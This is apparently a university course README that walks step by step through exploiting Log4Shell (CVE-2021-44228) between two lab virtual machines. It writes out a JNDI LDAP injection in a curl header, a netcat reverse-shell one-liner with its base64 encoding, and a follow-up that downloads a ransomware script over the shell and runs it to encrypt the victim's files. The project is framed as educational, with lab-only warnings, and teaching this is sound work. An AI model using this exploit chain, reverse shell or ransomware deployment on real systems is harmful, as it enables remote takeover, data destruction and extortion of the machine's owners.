# UNIVR - Fondamenti di Sicurezza e Privacy - project 2021

# UNIVR - Fondamenti di Sicurezza e Privacy - project 2021

*>> **This repository is for educational purpose only so do not use it on machines that are not yours** <<*
*>> **Do not run ransomware.sh except in your dedicated test virtual machine. Any file with the chosen extension will be encrypted, so be careful as you may lose your files** <<*

To simulate **CVE-2021-44228**[<sup>1</sup>](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), Log4j vulnerability also known as **Log4Shell**, you can follow this steps.

### General setup

 - Download and install two linux based VM.
 I chosed Kali Linux Virtual Box image[<sup>2</sup>](https://kali.download/virtual-images/kali-2021.4a/kali-linux-2021.4a-virtualbox-amd64.ova)
 - Create a Network with NAT

 <img src="https://github.com/Fantantonio/Log4ShellVictim/blob/master/readme_images/VBox_NAT.png">
 
 - Set the Network to the new one for both VMs

 <img src="https://github.com/Fantantonio/Log4ShellVictim/blob/master/readme_images/VM_Network.png">

 - Run both VMs one after the other and run this command:
 `sudo apt-get update -y && sudo apt-get upgrade -y`
 - Download\* the Java SE Development Kit 8u181 (jdk1.8.0_181) from Oracle website [<sup>3</sup>](https://www.oracle.com/it/java/technologies/javase/javase8-archive-downloads.html#:~:text=jdk%2D8u181%2Dlinux%2Dx64.tar.gz) and install it in the *victim* VM
 *you need an Oracle account (it's free)

### Victim VM setup

- In the victim VM download the [Log4ShellVictim.jar](https://github.com/Fantantonio/Log4ShellVictim/blob/master/Log4ShellVictim.jar) and run it with the command `sudo java- jar /to/your/path/Log4ShellVictim.jar`. The default port is 8080
- Use `ifcongig` command to know your victim VM's IP, in my case is `192.168.0.5`

### Attacker VM setup

- Download the [JNDIExploit.v1.2.zip](https://github.com/black9/Log4shell_JNDIExploit/blob/main/JNDIExploit.v1.2.zip) in the *attacker* VM and unzip it with the command `unzipJNDIExploit.v1.2.zip`
- Run it with the following command: `java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.0.4 -p 8888` where `192.168.0.4` is the attacker VM's IP and `8888` is the HTTP listener port. Consider that the LDAP server will listen to the `1389` port by default
- Run `nc -nvlp 1234` in the attacker VM to listen to the `1234` port with Netcat
- Get a reverse shell command like this one: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.0.4 1234 >/tmp/f`\* note that `1234` is the port we set Netcat to listen to earlier
 \* you can use the [Revshell](https://www.revshells.com) website to build your own command
 - Run `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.0.4 1234 >/tmp/f" | base64` to encode it in base64. Of course use your command replacing mine.
 The output should look something like this: `cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMC40IDEyMzQgPi90bXAvZgo=`
 - Run the curl from the attacher VM like so: `curl 192.168.0.5:8080 -H 'X-Api-Version:${jndi:ldap://192.168.0.4:1389/Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMC40IDEyMzQgPi90bXAvZgo=}’`
 Replace `192.168.0.5` with your victim VM's IP, `192.168.0.4` with your attacker VM's IP and `cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguMC40IDEyMzQgPi90bXAvZgo=` with your remote shell command base64 encoded.

Now you should see the vulnerability letting you as attacker run the command you injected in the request header and the remote shell ready where you set Netcat listen.

### A step further

- Download ransomware.sh file in `\var\www\html` folder of the attacker machine. Remember to edit the script adding your bot token, your telegram account id, the file extensions you want to encrypt and the string you want to write in the README.txt file will be generated for the victim
- Start apache in the attacker machine running `service apache2 start`
- Use the remote shell to download the ransomware file in the victim machine with the command: `wget 192.168.0.4/ransomware.sh` where `192.168.0.4` is the attacker VM's IP
- One more time use the remote shell to run it `sh ransomware.sh` and copy down the decryption key you'll receive in console as output if you want to be able to decrypt everything using the `decrypter.sh` file.

### Footnotes
[\[1\] https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
[\[2\] https://kali.download/virtual-images/kali-2021.4a/kali-linux-2021.4a-virtualbox-amd64.ova](https://kali.download/virtual-images/kali-2021.4a/kali-linux-2021.4a-virtualbox-amd64.ova)
[\[3\] https://www.oracle.com/it/java/technologies/javase/javase8-archive-downloads.html#:~:text=jdk%2D8u181%2Dlinux%2Dx64.tar.gz](https://www.oracle.com/it/java/technologies/javase/javase8-archive-downloads.html#:~:text=jdk%2D8u181%2Dlinux%2Dx64.tar.gz)
